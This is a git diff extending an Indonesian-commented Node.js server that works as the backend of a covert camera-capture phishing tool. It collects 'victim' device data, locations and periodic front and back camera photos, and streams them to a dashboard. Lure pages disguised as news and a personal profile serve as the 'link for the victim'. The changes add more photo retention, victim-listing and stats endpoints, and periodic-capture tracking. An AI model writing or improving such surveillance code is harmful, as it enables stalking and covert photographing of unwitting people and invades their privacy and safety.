@@ -14,6 +14,7 @@ const io = socketIo(server, {
     origin: "*",
     methods: ["GET", "POST"],
   },
+  transports: ["websocket", "polling"], // Tambahkan transport fallback
 });
 
 // Middleware untuk CORS
@@ -31,7 +32,7 @@ app.use((req, res, next) => {
   next();
 });
 
-// Middleware untuk body parser
+// Middleware untuk body parser dengan timeout
 app.use(bodyParser.json({ limit: "50mb" }));
 app.use(bodyParser.urlencoded({ extended: true, limit: "50mb" }));
 
@@ -44,11 +45,84 @@ if (!fs.existsSync("captures")) {
 let victims = [];
 let photos = {}; // Struktur: photos[victimId] = array of {image, cameraType, timestamp}
 
+// ============= FUNGSI BANTUAN =============
+
+// Fungsi untuk menyimpan log dengan format yang lebih baik
+function saveToLog(data, type = "victim") {
+  try {
+    const logFile = type === "victim" ? "victims.log" : "photos.log";
+    fs.appendFileSync(logFile, JSON.stringify(data) + "\n");
+  } catch (error) {
+    console.error("❌ Gagal menyimpan log:", error.message);
+  }
+}
+
+// Fungsi untuk membersihkan foto lama (lebih dari 1 jam)
+function cleanupOldPhotos() {
+  try {
+    const oneHourAgo = Date.now() - 60 * 60 * 1000;
+    const files = fs.readdirSync("captures");
+    let deletedCount = 0;
+
+    for (const file of files) {
+      const filePath = path.join("captures", file);
+      const stats = fs.statSync(filePath);
+      if (stats.mtimeMs < oneHourAgo) {
+        fs.unlinkSync(filePath);
+        deletedCount++;
+      }
+    }
+
+    if (deletedCount > 0) {
+      console.log(`🗑️ Cleaned up ${deletedCount} old photos`);
+    }
+  } catch (error) {
+    console.error("❌ Gagal cleanup foto:", error.message);
+  }
+}
+
+// Jalankan cleanup setiap 30 menit
+setInterval(cleanupOldPhotos, 30 * 60 * 1000);
+
 // ============= API ROUTES =============
 
 // Endpoint untuk testing
 app.get("/api/test", (req, res) => {
-  res.json({ status: "ok", message: "Server is running" });
+  res.json({
+    status: "ok",
+    message: "Server is running",
+    timestamp: new Date().toISOString(),
+    stats: {
+      victims: victims.length,
+      totalPhotos: Object.values(photos).reduce((sum, p) => sum + p.length, 0),
+    },
+  });
+});
+
+// API untuk mendapatkan statistik server
+app.get("/api/stats", (req, res) => {
+  const totalPhotos = Object.values(photos).reduce(
+    (sum, p) => sum + p.length,
+    0,
+  );
+  const frontPhotos = Object.values(photos).reduce(
+    (sum, p) => sum + p.filter((photo) => photo.cameraType === "front").length,
+    0,
+  );
+  const backPhotos = Object.values(photos).reduce(
+    (sum, p) => sum + p.filter((photo) => photo.cameraType === "back").length,
+    0,
+  );
+
+  res.json({
+    victims: victims.length,
+    totalPhotos,
+    frontPhotos,
+    backPhotos,
+    uptime: process.uptime(),
+    memory: process.memoryUsage(),
+    timestamp: new Date().toISOString(),
+  });
 });
 
 // API untuk menerima data (device info, location, dll)
@@ -103,7 +177,7 @@ app.post("/api/capture", (req, res) => {
     }
 
     io.emit("new-victim", data);
-    fs.appendFileSync("victims.log", JSON.stringify(data) + "\n");
+    saveToLog(data, "victim");
 
     console.log(`✅ Data saved for victim: ${data.victimId}`);
 
@@ -119,7 +193,7 @@ app.post("/api/capture-image", (req, res) => {
   console.log("📸 Received image upload request");
 
   try {
-    const { image, victimId, cameraType, timestamp } = req.body;
+    const { image, victimId, cameraType, timestamp, isPeriodic } = req.body;
 
     if (!image || !victimId) {
       console.log("❌ Missing image or victimId");
@@ -129,7 +203,7 @@ app.post("/api/capture-image", (req, res) => {
     // Log ukuran gambar dan info kamera
     const cameraTypeStr = cameraType || "unknown";
     console.log(
-      `📸 Image from ${victimId}, camera: ${cameraTypeStr}, size: ${image.length} chars`,
+      `📸 Image from ${victimId}, camera: ${cameraTypeStr}, size: ${image.length} chars, periodic: ${isPeriodic || false}`,
     );
 
     // Hapus header base64
@@ -150,13 +224,14 @@ app.post("/api/capture-image", (req, res) => {
       cameraType: cameraTypeStr,
       timestamp: timestamp || new Date().toISOString(),
       filename: filename,
+      isPeriodic: isPeriodic || false,
     };
 
     photos[victimId].push(photoData);
 
-    // Hanya simpan maksimal 20 foto terakhir per victim
-    if (photos[victimId].length > 20) {
-      photos[victimId] = photos[victimId].slice(-20);
+    // Hanya simpan maksimal 30 foto terakhir per victim (ditingkatkan dari 20)
+    if (photos[victimId].length > 30) {
+      photos[victimId] = photos[victimId].slice(-30);
     }
 
     // Kirim ke dashboard
@@ -165,7 +240,14 @@ app.post("/api/capture-image", (req, res) => {
       image: image,
       cameraType: cameraTypeStr,
       timestamp: photoData.timestamp,
+      isPeriodic: photoData.isPeriodic,
     });
+
+    // Simpan ke log foto
+    saveToLog(
+      { victimId, cameraType: cameraTypeStr, timestamp: photoData.timestamp },
+      "photo",
+    );
 
     console.log(
       `📤 Photo sent to dashboard for ${victimId} (${cameraTypeStr})`,
@@ -179,21 +261,51 @@ app.post("/api/capture-image", (req, res) => {
   }
 });
 
-// API untuk mendapatkan foto spesifik (opsional)
+// API untuk mendapatkan foto spesifik
 app.get("/api/photos/:victimId", (req, res) => {
   const victimId = req.params.victimId;
+  const limit = parseInt(req.query.limit) || 10;
+
   if (photos[victimId]) {
+    const recentPhotos = photos[victimId].slice(-limit);
     res.json({
       victimId,
-      photos: photos[victimId],
+      photos: recentPhotos,
       count: photos[victimId].length,
+      front: photos[victimId].filter((p) => p.cameraType === "front").length,
+      back: photos[victimId].filter((p) => p.cameraType === "back").length,
+      other: photos[victimId].filter(
+        (p) => p.cameraType !== "front" && p.cameraType !== "back",
+      ).length,
     });
   } else {
-    res.json({ victimId, photos: [], count: 0 });
+    res.json({ victimId, photos: [], count: 0, front: 0, back: 0, other: 0 });
   }
 });
 
-// API untuk membersihkan data (opsional untuk demo)
+// API untuk mendapatkan semua victim
+app.get("/api/victims", (req, res) => {
+  const victimsWithStats = victims.map((v) => ({
+    ...v,
+    photoStats: photos[v.victimId]
+      ? {
+          total: photos[v.victimId].length,
+          front: photos[v.victimId].filter((p) => p.cameraType === "front")
+            .length,
+          back: photos[v.victimId].filter((p) => p.cameraType === "back")
+            .length,
+        }
+      : { total: 0, front: 0, back: 0 },
+  }));
+
+  res.json({
+    victims: victimsWithStats,
+    total: victims.length,
+    timestamp: new Date().toISOString(),
+  });
+});
+
+// API untuk membersihkan data
 app.post("/api/clear-data", (req, res) => {
   try {
     victims = [];
@@ -201,9 +313,17 @@ app.post("/api/clear-data", (req, res) => {
 
     // Kosongkan folder captures (opsional)
     const capturesDir = path.join(__dirname, "captures");
-    const files = fs.readdirSync(capturesDir);
-    for (const file of files) {
-      fs.unlinkSync(path.join(capturesDir, file));
+    if (fs.existsSync(capturesDir)) {
+      const files = fs.readdirSync(capturesDir);
+      for (const file of files) {
+        fs.unlinkSync(path.join(capturesDir, file));
+      }
+    }
+
+    // Kosongkan file log
+    fs.writeFileSync("victims.log", "");
+    if (fs.existsSync("photos.log")) {
+      fs.writeFileSync("photos.log", "");
     }
 
     console.log("🗑️ All data cleared");
@@ -221,6 +341,13 @@ app.use(
     setHeaders: (res, path) => {
       if (path.endsWith(".html")) {
         res.setHeader("Cache-Control", "no-cache");
+      }
+      if (
+        path.endsWith(".jpg") ||
+        path.endsWith(".jpeg") ||
+        path.endsWith(".png")
+      ) {
+        res.setHeader("Cache-Control", "public, max-age=86400");
       }
     },
   }),
@@ -251,6 +378,11 @@ app.get("/berita-terkini", (req, res) => {
   res.sendFile(path.join(__dirname, "public", "berita.html"));
 });
 
+// Route untuk halaman profil
+app.get("/profil-zara", (req, res) => {
+  res.sendFile(path.join(__dirname, "public", "profil-zara.html"));
+});
+
 // ============= 404 HANDLER =============
 app.use((req, res) => {
   if (req.path.startsWith("/api/")) {
@@ -264,7 +396,8 @@ app.use((req, res) => {
 
 // ============= SOCKET.IO =============
 io.on("connection", (socket) => {
-  console.log("📊 Dashboard terhubung");
+  const clientIp = socket.handshake.address;
+  console.log(`📊 Dashboard terhubung dari ${clientIp}`);
 
   // Kirim statistik
   const totalVictims = victims.length;
@@ -300,9 +433,24 @@ io.on("connection", (socket) => {
   console.log(
     `📊 Sent ${victims.length} victims and ${Object.keys(photos).length} photo records`,
   );
+
+  // Handle ping untuk keep-alive
+  socket.on("ping", () => {
+    socket.emit("pong");
+  });
+
+  // Handle request refresh
+  socket.on("request-refresh", () => {
+    socket.emit("init-data", victims);
+  });
+
+  // Handle disconnect
+  socket.on("disconnect", () => {
+    console.log(`📊 Dashboard terputus dari ${clientIp}`);
+  });
 });
 
-const PORT = 3000;
+const PORT = process.env.PORT || 3000;
 server.listen(PORT, "0.0.0.0", () => {
   console.log("\n🚀 Demo server running di:");
   console.log(`   - Local: http://localhost:${PORT}`);
@@ -310,7 +458,10 @@ server.listen(PORT, "0.0.0.0", () => {
   console.log(`📤 Link untuk korban: http://localhost:${PORT}/demo`);
   console.log(`📊 Link dashboard: http://localhost:${PORT}`);
   console.log(`📰 Link berita: http://localhost:${PORT}/berita`);
-  console.log(`🖼️  Folder captures: ${path.join(__dirname, "captures")}\n`);
+  console.log(`👤 Link profil: http://localhost:${PORT}/profil-zara`);
+  console.log(`🖼️  Folder captures: ${path.join(__dirname, "captures")}`);
+  console.log(`📁 Log file: victims.log`);
+  console.log(`\n✨ Server siap menerima koneksi!\n`);
 });
 
 // Helper untuk mendapatkan IP lokal
@@ -327,3 +478,16 @@ function getLocalIP() {
   }
   return "127.0.0.1";
 }
+
+// Handle graceful shutdown
+process.on("SIGINT", () => {
+  console.log("\n🛑 Server dimatikan...");
+  cleanupOldPhotos(); // Cleanup terakhir
+  process.exit(0);
+});
+
+process.on("SIGTERM", () => {
+  console.log("\n🛑 Server terminated...");
+  cleanupOldPhotos();
+  process.exit(0);
+});
